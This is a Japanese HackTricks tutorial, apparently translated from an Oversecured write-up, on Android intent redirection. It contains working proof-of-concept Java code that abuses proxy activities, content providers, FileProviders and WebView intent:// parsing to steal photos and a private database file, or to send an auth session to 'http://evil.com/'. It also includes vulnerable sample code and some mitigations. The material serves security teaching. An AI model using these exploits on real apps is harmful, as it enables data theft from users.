<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>


**調査はこちらから** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# はじめに

この脆弱性は**ウェブセキュリティのOpen Redirect**に似ています。`Intent`クラスは`Parcelable`であるため、**このクラスに属するオブジェクト**は、別の`Intent`オブジェクトの**追加データ**として**渡すことができます**。\
多くの開発者はこの**機能**を利用して、**プロキシコンポーネント**（アクティビティ、ブロードキャストレシーバー、サービス）を作成し、`startActivity(...)`、`sendBroadcast(...)`などの危険なメソッドに**埋め込まれたIntentを渡します**。\
これは危険です。なぜなら、**攻撃者がアプリに対して直接起動できない非エクスポートコンポーネントを起動させたり、攻撃者にコンテンツプロバイダへのアクセスを許可させることができるからです**。**`WebView`**も時々、`Intent.parseUri(...)`メソッドを使用して**URLを文字列から`Intent`オブジェクトに変更し**、`startActivity(...)`に渡します。

{% hint style="info" %}
要約すると：攻撃者が不安全に実行されているIntentを送信できる場合、エクスポートされていないコンポーネントにアクセスし、それらを悪用する可能性があります。
{% endhint %}

# 典型的なケース

例を見てみましょう。`AndroidManifest.xml`ファイルの断片
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Activity `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Activity `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity`は、この場合`url`パラメーターから取得したURLにユーザーの認証セッションを渡すという、**特定の安全でないアクションを実行する隠されたアプリ機能の例**です。

輸出制限により、**攻撃者は`AuthWebViewActivity`に直接アクセスできません**。直接呼び出し
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
```markdown
`java.lang.SecurityException`がスローされ、`Permission Denial`: `AuthWebViewActivity`がuid 1337からエクスポートされていないためです。

しかし、攻撃者は**被害者に`AuthWebViewActivity`を自ら起動させることができます**：
```
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
# 影響のエスカレーション

この脆弱性の影響をエスカレートさせるためには、**他の脆弱性や誤設定を見つける必要があります。これにより、脆弱性の影響を増大させることができます**（脆弱性自体はリスクを生じさせません）。

## Content Providersを介した攻撃のエスカレーション

元のアプリの任意のコンポーネントへのアクセスに加えて、**攻撃者は脆弱なアプリのContent Providersのアクセスを試みることができます**。以下の条件を満たす必要があります：

* **非エクスポート**されている必要があります（そうでなければ、**直接攻撃される可能性があります**、この記事で議論している脆弱性を使用せずに）
* **`android:grantUriPermissions`** フラグが **`true`** に設定されている必要があります。
* `android:grantUriPermissions="true"` は、Javaコードがその `ContentProvider` によって提供される **任意の `Uri`** で `FLAG_GRANT_READ_URI_PERMISSION` と `FLAG_GRANT_WRITE_URI_PERMISSION` を使用できることを示します。
* `android:grantUriPermissions="false"` は、**`<grant-uri-permission>` 子要素によって指定された `Uri` 値のみ** が `FLAG_GRANT_READ_URI_PERMISSION` と `FLAG_GRANT_WRITE_URI_PERMISSION` で使用できることを示します。

攻撃者は、埋め込まれたインテントの受信者として自身を設定し、以下のフラグを設定する必要があります

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` はプロバイダへの永続的なアクセスを許可します（このフラグがない場合、アクセスは一回限りです）
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` はURIへのプレフィックスによるアクセスを許可します - 例えば、`content://com.victim.provider/image/1` のような完全なパスを使用して繰り返しアクセスを取得する代わりに、攻撃者はURI `content://com.victim.provider/` を使用してプロバイダの全コンテンツへのアクセスを許可し、その後 `ContentResolver` を使用して `content://com.victim.provider/image/1`、`content://com.victim.provider/image/2` などにアクセスします。
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` はプロバイダへの読み取り操作（`query`、`openFile`、`openAssetFile` など）を許可します
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` は書き込み操作を許可します

攻撃者がアクセスを取得し、`query`、`update`、`insert`、`delete`、`openFile`、`openAssetFile` などの通常の操作を行うことができる典型的なプロバイダの例
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
ユーザーの写真の盗難の例 `AndroidManifest.xml` ファイル
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
`MainActivity.java` ファイル
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Android File Providerへの攻撃

この脆弱性により、攻撃者は開発者が事前に定めたディレクトリに位置する**アプリファイルを盗む**ことも可能になります。攻撃を成功させるためには、悪意のあるアプリが**Android File Providerへのアクセス権を取得し、Android ContentResolverを使用してファイルプロバイダーから内容を読み取る**必要があります。

ファイルプロバイダーの例（詳細は[https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider)を参照）
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
ファイルへの読み書きアクセスを提供します。これはアプリリソース内の特別なリストにあり、この場合は `res/xml/provider_paths.xml` で見つけることができます。

それはおそらく次のように見えるでしょう
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
```markdown
各タグは、ルートに対して相対的な`path`値を持つルートディレクトリを指定します。例えば、`external_files`の値は`new File(Environment.getExternalStorageDirectory(), "images")`に対応します。

`root-path`の値は`/`に対応し、任意のファイルへのアクセスを提供します。

例えば、秘密のデータが`/data/data/com.victim/databases/secret.db`ファイルに保存されているとしましょう：このファイルの盗難は`MainActivity.java`で以下のようになるかもしれません
```
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## WebViewを介した任意のコンポーネントへのアクセス

Intentオブジェクトは、`Intent.toUri(flags)`の呼び出しで文字列にキャストでき、`Intent.parseUri(stringUri, flags)`を使用して文字列からIntentに戻すことができます。この機能は、WebView（アプリの組み込みブラウザー）でよく使用されます：**アプリは`intent://`スキームを検証し、URLをIntentに解析してアクティビティを起動することができます**。

**この脆弱性は、他の脆弱性を介しても悪用される可能性があります**（例えば、エクスポートされたアクティビティを介してWebViewでアプリ内で任意のリンクを直接開く能力、またはディープリンクメカニズムを通じて）クライアントアプリで、またはリモートで、サーバーサイドのクロスサイトスクリプティングやクライアントサイドのMitMを含む

脆弱なコードの例
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
```markdown
ここでのポイントは、`WebViewClient` クラスの `shouldOverrideUrlLoading(...)` メソッドが WebView が新しいリンクをロードしようとするたびに呼び出されるが、アプリにカスタムハンドラを追加するオプションを与えることです。

この脆弱性を悪用するために、攻撃者は特別に準備された intent-scheme URL への WebView リダイレクトを作成する必要があります。URL 作成の例
```
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
例の攻撃
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
このバージョンには、**クラシックバージョンの脆弱性と比較していくつかの制限があります**：

* 埋め込まれた `Parcelable` と `Serializable` オブジェクトは文字列にキャストできません（無視されます）
* `Intent.parseUri(...)` が呼び出されたとき、不安全なフラグ `Intent.FLAG_GRANT_READ_URI_PERMISSION` と `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` は**無視されます**。パーサーは `Intent.URI_ALLOW_UNSAFE` フラグが設定されている場合のみそれらを残します（`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` とても稀です

多くの開発者は、WebView経由で受け取ったインテントの完全なフィルタリングを行うことを忘れがちです。
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
Uri uri = request.getUrl();
if("intent".equals(uri.getScheme())) {
Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
startActivity(intent);
return true;
}
return super.shouldOverrideUrlLoading(view, request);
}
```
攻撃者はセレクタを使用して、エクスポートされていないコンポーネントを指定できます
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
アプリの明示的なインテントに対する保護をバイパスします。したがって、セレクタのフィルタリングも推奨します。
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
しかし、完全なフィルタリングを行っても、攻撃者が非エクスポートされたアクティビティの`intent-filter`に対応する暗黙的なインテントを作成することで、完全な保護が保証されるわけではありません。アクティビティ宣言の例：
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<data android:scheme="victim" android:host="secure_handler" />
</intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
したがって、アクティビティがエクスポートされる前に、それが起動されるかどうかを確認することをお勧めします。

## インテントを不安全に作成する他の方法

一部のアプリ開発者は、**独自のインテントパーサー**を実装しています（しばしば**ディープリンク**やプッシュメッセージを処理するために）、例えば**JSON**オブジェクト、文字列、またはバイト配列を使用しており、これらはデフォルトと異ならないか、または非常に危険を伴います。なぜなら、**`Serializable`**や`Parcelable`オブジェクトを拡張する可能性があり、不安全なフラグを設定することも許可されているからです。セキュリティ研究者は、バイト配列を`Parcel`にキャストし、そこからインテントを読み取るなど、よりエキゾチックなインテント作成のバージョンに遭遇することもあります。
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
Parcel parcel = Parcel.obtain();
parcel.unmarshall(handle, 0, handle.length);
startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# 脆弱性アプリ

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>
